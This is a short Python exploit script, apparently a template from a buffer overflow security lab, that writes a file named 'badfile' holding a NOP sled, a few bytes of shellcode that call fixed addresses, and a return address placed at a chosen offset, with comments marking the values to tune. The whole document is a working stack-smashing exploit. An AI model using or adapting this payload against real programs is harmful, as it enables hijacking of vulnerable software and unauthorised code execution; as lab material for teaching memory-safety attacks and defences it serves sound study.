#!/usr/bin/python3
import sys

shellcode= (
   "\xbb\xa2\x62\x55\x56\xff\xd3\x50\xbb\x86\x62\x55\x56\xff\xd3"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(2030)) 
start = 2030 - len(shellcode)
content[start:start+len(shellcode)] = shellcode

##################################################################

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0xffffcdd8 + 0x181   # Change this number 
offset = 336              	# Change this number 

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address

content[offset : offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
